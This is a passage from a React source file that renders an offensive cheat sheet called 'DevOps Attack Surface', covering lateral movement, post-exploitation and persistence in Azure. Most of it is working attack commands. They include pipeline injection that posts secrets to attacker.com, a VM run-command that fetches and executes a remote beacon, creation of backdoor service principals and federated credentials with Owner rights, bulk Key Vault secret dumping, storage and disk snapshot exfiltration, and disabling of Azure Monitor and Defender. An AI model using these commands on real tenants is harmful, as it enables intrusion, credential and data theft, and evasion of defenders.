kubectl get serviceaccount -n NAMESPACE SA_NAME -o yaml | grep azure

# --- Azure Arc (hybrid) ---
az connectedmachine list                     # Arc-enrolled on-prem servers
az connectedmachine extension list --machine-name SERVER --resource-group RG
# Arc agents can run extensions (scripts) — if you control Arc → RCE on on-prem

# --- Azure DevOps → Azure Subscription ---
# Service connections in Azure DevOps use SPs — steal to access subscriptions:
az devops service-endpoint list --org https://dev.azure.com/ORG --project PROJ
# Pipeline YAML injection (similar to GitHub Actions):
# steps:
# - script: env | curl -X POST https://attacker.com -d @-
#   env:
#     SECRET: $(MY_SECRET)

# --- VM Run Command (lateral movement via RBAC) ---
# If you have Microsoft.Compute/virtualMachines/runCommand/action:
az vm run-command invoke \
  --resource-group RG \
  --name VM_NAME \
  --command-id RunShellScript \
  --scripts "curl http://ATTACKER/beacon | bash"

# --- Storage Account SAS Token Abuse ---
# Generate SAS with full access (if you have storage key):
az storage account keys list --account-name ACCOUNT
az storage container generate-sas \
  --account-name ACCOUNT \
  --name CONTAINER \
  --permissions racwdl \
  --expiry 2099-01-01 \
  --account-key KEY
# Use SAS to access storage from anywhere without further auth`
      },
      {
        title: 'Phase 4 — Post-Exploitation & Persistence',
        code: `# --- Create backdoor Service Principal ---
az ad app create --display-name "AzureMonitoringAgent"
APP_ID=$(az ad app list --display-name "AzureMonitoringAgent" --query '[0].appId' -o tsv)
az ad sp create --id $APP_ID
# Add client secret:
az ad app credential reset --id $APP_ID --credential-description "backup"
# Assign Owner to subscription:
az role assignment create \
  --assignee $APP_ID \
  --role "Owner" \
  --scope /subscriptions/SUB_ID
# Login with backdoor SP:
az login --service-principal -u $APP_ID -p <SECRET> --tenant TENANT_ID

# --- Federated credential (no secret — harder to detect) ---
az ad app federated-credential create --id APP_ID \
  --parameters '{
    "name":"backdoor","issuer":"https://token.actions.githubusercontent.com",
    "subject":"repo:attacker/repo:ref:refs/heads/main",
    "audiences":["api://AzureADTokenExchange"]
  }'
# Now GitHub Actions from attacker repo can assume this SP without any stored secret

# --- Key Vault bulk dump ---
az keyvault list --query '[].name' -o tsv | while read vault; do
  echo "=== $vault ===";
  az keyvault secret list --vault-name $vault --query '[].name' -o tsv | while read secret; do
    echo "$secret: $(az keyvault secret show --vault-name $vault --name $secret --query 'value' -o tsv)";
  done;
done

# --- Storage exfiltration ---
az storage account list --query '[].name' -o tsv | while read acct; do
  az storage container list --account-name $acct --auth-mode login --query '[].name' -o tsv | while read cont; do
    azcopy copy "https://$acct.blob.core.windows.net/$cont/*" /tmp/exfil/ --recursive;
  done;
done

# --- Disable Azure Monitor / Defender ---
az monitor diagnostic-settings delete --name SETTINGS_NAME --resource RESOURCE_ID
az security setting update --name MCAS --setting-type DataExportSettings --enabled false

# --- PIM Role Activation (if attacker has eligible assignment) ---
az rest --method POST \
  --url "https://management.azure.com/providers/Microsoft.Authorization/roleAssignmentScheduleRequests/REQUEST_ID?api-version=2020-10-01" \
  --body '{"requestType":"SelfActivate","principalId":"ATTACKER_ID","roleDefinitionId":"OWNER_ROLE_ID","directoryScopeId":"/","justification":"Maintenance"}'

# --- Azure AD backdoor: add credential to existing app ---
# Add a new client secret to a legitimate high-privilege app:
az ad app credential reset --id LEGITIMATE_APP_ID \
  --credential-description "legacy-compat" \
  --years 99
# Keep existing creds — this just adds a new one silently

# --- Snapshot exfiltration ---
az snapshot create --resource-group RG --name exfil-snap --source /subscriptions/SUB/resourceGroups/RG/providers/Microsoft.Compute/disks/DISK
az snapshot grant-access --resource-group RG --name exfil-snap --duration-in-seconds 86400
# Returns a SAS URL — download entire disk image from anywhere`
      }
    ]
  },
];

export default function DevOps() {
  const scrollTo = (id) => { const el = document.getElementById(id); if (el) el.scrollIntoView({ behavior: 'smooth', block: 'start' }); };
  return (
    <div className="space-y-12">
      <div className="text-center mb-10">
        <h1 className="text-3xl md:text-5xl font-bold font-mono tracking-tight">
          <span className="text-slate-200">DevOps </span><span className="text-blue-400">Attack Surface</span>
        </h1>
        <p className="text-slate-500 font-mono text-sm mt-3">Docker • Kubernetes • Jenkins • GitHub Actions • GitLab CI • Ansible • Terraform • Vault • AWS • GCP • Azure</p>
      </div>
      <ArchitectureMap columns={mapColumns} onNodeClick={scrollTo} />
      <div className="border-t border-slate-800/50 pt-10 grid grid-cols-1 gap-4">
        {techniques.map((t) => (
          <div key={t.id} id={t.id}>
            <TechniqueCard title={t.title} subtitle={t.subtitle} tags={t.tags} accentColor={t.accentColor} overview={t.overview} steps={t.steps} commands={t.commands} />
          </div>
        ))}
      </div>
    </div>
  );
}